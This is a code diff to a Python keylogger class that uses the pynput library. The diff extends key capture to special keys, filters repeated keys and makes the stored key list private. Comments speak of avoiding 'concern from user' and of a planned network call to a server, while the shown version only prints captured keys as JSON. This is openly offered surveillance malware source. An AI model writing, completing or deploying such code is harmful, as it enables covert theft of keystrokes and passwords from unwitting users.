@@ -1,7 +1,8 @@
-from typing import List, Final, Dict
+from typing import List, Final, Dict, Optional, Union
 import json
 
 from pynput import keyboard  # type: ignore
+from pynput.keyboard import Key, KeyCode  # type: ignore
 
 # Maximum number of keys to save, keep low to avoid memory issues
 # that could warrant concern from user
@@ -19,33 +20,34 @@ class Keylogger:
     {"keys_pressed": ["shift", "space", ...] }
     """
 
-    keys_pressed: List[str]
+    __keys_pressed: List[str] = []
+    __pressed: Optional[str] = None
 
-    def __init__(self):
-        self.keys_pressed = []
-
-    def log_key(self, key: keyboard.Key):
+    def log_key(self, key: Union[Key, KeyCode]):
         """
-        Logs keyboard event by name
+        Logs keyboard event
 
         Paramters
         ---------
 
-        event: KeyboardEvent
+        event: keyboard.Key
              Event to log
         """
         try:
-            self.keys_pressed.append(key.char)
+            if self.__pressed != key.char:
+                self.__pressed = key.char
+                self.__keys_pressed.append(key.char)
         except AttributeError:
-            # special or invalid key do nothing
-            pass
+            if self.__pressed != key.name:
+                self.__pressed = key.name
+                self.__keys_pressed.append(key.name)
 
-        if len(self.keys_pressed) >= SAVED_KEYS_LIMIT:
+        if len(self.__keys_pressed) >= SAVED_KEYS_LIMIT:
             # TODO: make network call to server
             #
             # Proof of concept: print to terminal
             print(self.__to_json())
-            self.keys_pressed.clear()
+            self.__keys_pressed.clear()
 
     def __to_json(self) -> str:
         """
@@ -58,7 +60,7 @@ class Keylogger:
              Object represented as JSON
              { "keys_pressed": ["shift", "space", ...] }
         """
-        keys_json: Dict[str, List[str]] = {"keys_pressed": self.keys_pressed}
+        keys_json: Dict[str, List[str]] = {"keys_pressed": self.__keys_pressed}
         return json.dumps(keys_json)
 
 
